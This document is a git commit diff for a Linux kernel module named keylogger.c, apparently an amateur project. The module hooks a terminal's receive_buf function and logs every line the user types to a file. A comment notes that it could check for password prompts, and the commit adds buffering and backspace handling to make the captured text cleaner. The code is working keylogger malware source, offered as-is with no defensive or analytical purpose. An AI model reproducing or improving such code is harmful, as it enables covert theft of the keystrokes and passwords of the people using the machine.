a3cc866c958c12781370e3cfc6a8d7fb3c308ede
jnavarro <jesus_navarro88@yahoo.com>
2011-11-24 09:09:19 -0800

    logging handles backspace now

--- keylogger.c
+++ keylogger.c
@@ -4,6 +4,7 @@
 #include <linux/errno.h> // not too sure about this
 #include <linux/unistd.h> // we're messing with syscalls
 #include <linux/syscalls.h> // same as above
+#include <linux/slab.h>
 #include <linux/tty.h>
 #include <linux/fs.h>
 #include "headers/kfile.h" // file operations
@@ -11,8 +12,42 @@
 // a module license is required for most modules to run
 MODULE_LICENSE("GPL");
 
+// defines for some constants
+#define MAX_BUFFER 256
+#define MAX_SPECIAL_CHAR_SIZE 12
+// backspace chars
+#define BACKSPACE_1 127 //local
+#define BACKSPACE_2 8 // remote
+
 // our log file
 struct file* logfile;
+
+// a struct to hold our chars
+struct logger {
+  int pos;
+  char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE];
+};
+
+// our logger
+struct logger* logger;
+
+// functions for our logging, aka appending and resetting
+void append_char(char* source, size_t count){
+  if((logger->pos + count) > (MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE)){
+    // prevent overflow
+    return;
+  }
+  // otherwise, add the string to the buffer
+  strncat(logger->buf,source,count);
+  logger->pos += count;
+}
+void reset_logger(){
+  logger->pos = 0;
+  int i;
+  for(i = 0;i < MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE;i++){
+    logger->buf[i] = 0;
+  }
+}
 
 // pointer to the old receive_buf function
 void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
@@ -31,10 +66,28 @@ void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
     //if(L_ICANON(tty) && !L_ECHO(tty)) to check for passwd prompts
     // if we have a single character
     if(count == 1){
-      if(logfile) kwrite(logfile,0,cp,count*sizeof(char));
-    }
-    if(count > 0 && count != 1){
-      printk(KERN_ALERT "buffer is %s\n",cp);
+      // check if it's the backspace char
+      if(cp[0] == BACKSPACE_1 ||
+	 cp[0] == BACKSPACE_2){
+	// make sure we will remain in the buffer
+	if(logger->pos){
+	  logger->pos--;
+	  logger->buf[logger->pos] = 0;
+	}
+	return;
+      }
+      // otherwise, add the char
+      append_char((char*)cp,sizeof(char));
+
+      // check if the user pressed enter
+      if(cp[0] == 0x0D ||
+	 cp[0] == 0x0A){
+	// write our current log to our buffer
+	kwrite(logfile,0,logger->buf,logger->pos*sizeof(char));
+	// reset the logger
+	reset_logger();
+      }
+      //if(logfile) kwrite(logfile,0,cp,count*sizeof(char));
     }
   }
   // call the old function
@@ -45,7 +98,7 @@ static int init(void) {
   struct tty_struct* tty = NULL;
   struct file* file = NULL;
   logfile = NULL;
-  char* dev_name = "/dev/tty7";
+  char* dev_name = "/dev/tty";
 
   // open the tty
   file = kopen(dev_name,LF_FLAGS,LF_PERMS);
@@ -57,6 +110,12 @@ static int init(void) {
   if(logfile) kwrite(logfile,0,init_message,33);
 
   if(file){
+
+    // we got a tty, so lets init our logger
+    logger = NULL;
+    logger = (struct logger*)kmalloc(sizeof(struct logger),GFP_KERNEL);
+    reset_logger();
+
     printk(KERN_ALERT "tty was opened\n");
     struct tty_file_private* priv = NULL;
     priv = file->private_data;
@@ -79,14 +138,17 @@ static void exit(void) {
   char* exit_message = "-----end of log entry-----\n";
   if(logfile) kwrite(logfile,0,exit_message,27);
   if(logfile) kclose(logfile);
+
   // our structs
   struct tty_struct* tty = NULL;
   struct file* file = NULL;
-  char* dev_name = "/dev/tty7";
+  char* dev_name = "/dev/tty";
 
   // open the tty
   file = kopen(dev_name,LF_FLAGS,LF_PERMS);
   if(file){
+    // free our logger
+    kfree(logger);
     struct tty_file_private* priv = NULL;
     priv = file->private_data;
     if(priv) tty=priv->tty;
